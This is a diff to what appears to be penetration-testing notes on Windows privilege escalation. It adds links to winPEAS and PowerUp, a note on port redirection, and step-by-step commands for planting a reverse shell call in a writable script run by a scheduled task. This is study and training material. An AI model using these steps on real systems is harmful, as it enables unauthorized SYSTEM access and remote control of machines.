@@ -150,6 +150,14 @@ Dump groups:
 windows-privesc-check2.exe --dump -G
 ```
 
+### winPEAS
+
+{% embed url="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS" %}
+
+### PowerUp
+
+{% embed url="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1" %}
+
 ## Administrator Executables
 
 ### C Executables
@@ -956,6 +964,29 @@ Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,Tas
 
 One way to get hints can be by locating a script or log file that indicates a scheduled activity is being run, which is frequently required.
 
+#### Scheduled Tasks Privilege Escalation
+
+1. Check if we have write access to the script and that's running as Administrator or SYSTEM:
+
+   ```text
+   > C:\Dir\accesschk.exe /accepteula -quvw user C:\Dir\Vulnerable.ps1
+   ```
+
+2. Create a backup of the script:
+
+   ```text
+   > copy C:\Dir\Vulnerable.ps1 C:\Temp\
+   ```
+
+3. Start a listener on your host \(e.g Kali or Parrot\).
+4. Add a call to our reverse shell executable to the end of the script with echo:
+
+   ```text
+   > echo C:\PrivEsc\reverse.exe >> C:\Dir\Vulnerable.ps1
+   ```
+
+5. To finish the exploit, wait for the scheduled task to run \(it should run every x amount of time\).
+
 ## AlwaysInstallElevated
 
 ### Malicious MSI
@@ -1175,6 +1206,8 @@ This usually happens when the CLSID is not correct. As we know with the system t
 
 ### Port Forwarding
 
+The susceptible program may be listening on an internal port at times \(e.g localhost\). In these circumstances, we must redirect a port on Kali to a Windows internal port.
+
 Enumerate routing tables:
 
 ```text
@@ -1192,6 +1225,8 @@ Flags Explained:
 * a = display all active TCP connections
 * n = display address and port in numerical form
 * o = display the owner PID of each connection
+
+{% embed url="https://wixnic.gitbook.io/hacknotes/port-redirection-and-tunneling/port-redirection" %}
 
 ###  Shares
 
